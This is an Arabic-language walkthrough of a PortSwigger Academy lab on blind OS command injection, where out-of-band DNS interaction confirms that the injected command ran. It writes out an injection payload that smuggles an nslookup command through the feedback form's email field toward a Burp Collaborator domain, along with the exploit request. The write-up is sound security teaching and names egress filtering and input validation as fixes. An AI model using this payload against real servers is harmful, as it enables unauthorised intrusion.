# Lab 04 — Blind OS Command Injection with Out-of-Band Interaction (حقن أعمى خارجي OOB عبر DNS)

[![التصنيف](https://img.shields.io/badge/الفئة-OS%20Command%20Injection-red)]()
[![النوع](https://img.shields.io/badge/النوع-OS%20Command%20Injection%20(Blind%20Out-of-Band%20/%20OAST)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/os-command-injection)

> هذا الشرح جزء من سلسلة [معامل حقن أوامر النظام (OS Command Injection)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 04 — Blind OS Command Injection with Out-of-Band Interaction (حقن أعمى خارجي OOB عبر DNS) |
| **تصنيف الثغرة** | OS Command Injection (Blind Out-of-Band / OAST) |
| **معيار الضعف (CWE)** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | إثبات حقن الأوامر الأعمى بإجبار السيرفر على عمل استعلام DNS نحو خادم Burp Collaborator. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

في هذا السيناريو، حقل الإيميل في الفيدباك مصاب، ولكن:
1. الاستجابة عمياء لا تظهر أي مخرجات.
2. تم تعطيل أوامر التأخير الزمني (مثل ping و sleep).
3. مجلدات الصور محمية ولا يمكن الكتابة بداخلها.

**فكرة الحل (Out-of-Band - OAST):**
نطلب من السيرفر تنفيذ أمر شبكة يجبره على التواصل مع خادم خارجي يملكه المختبر (Burp Collaborator).
نحقن الأمر: `||nslookup <unique-subdomain>.oastify.com||`.
يقوم السيرفر بتنفيذ `nslookup`، فيرسل مفسر الـ DNS الداخلي في السيرفر استعلاماً عبر الإنترنت للبحث عن عنوان الدومين. يستقبل خادم Burp Collaborator هذا الاستعلام ويسجل عنوان IP السيرفر ووقت الاتصال، مما يثبت بشكل قاطع أن الأمر تم تنفيذه داخل السيرفر!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يستدعي أمر `nslookup` نحو نطاق Collaborator خارجي لتأكيد تنفيذ الكود خارج نطاق قناة الـ HTTP.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
عدم تقييد الاتصالات الخارجية للسيرفر (Egress Filtering) مع وجود حقن أوامر غير مفلتر في الباك إند.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. في أداة **Burp Suite Professional**، افتح تبويب **Collaborator** واضغط **Copy to clipboard** لنسخ دومين فريد (مثال: `xyz.oastify.com`).
2. التقط طلب إرسال الفيدباك `POST /feedback/submit` في Repeater.
3. في حقل `email`، احقن أمر الاستعلام محاطاً بـ `||` مع الدومين المنسوخ:
`email=x||nslookup+xyz.oastify.com||`.
4. اضغط Send.
5. ارجع لتبويب **Collaborator** في Burp واضغط على زر **Poll now**.
6. ستشاهد ظهور سجلات استعلامات DNS وردت من السيرفر الهدف تؤكد نجاح التنفيذ وحل اللاب!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /feedback/submit HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=...&name=a&email=x||nslookup+xyz.oastify.com||
&subject=b&message=c
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

{"message": "Thank you for submitting feedback"}
```

---

## 6. الأثر الواقعي للثغرة (Impact)

إمكانية إجبار السيرفر على الاتصال بأنظمة خارجية وتحميل برمجيات خبيثة أو استخدامه في هجمات DoS.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

التحقق الصارم من صحة الإيميل باستخدام دوال التحقق القياسية، وتقييد حركة البيانات الصادرة (Egress Firewall) لمنع السيرفر من عمل اتصالات عشوائية بالإنترنت.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
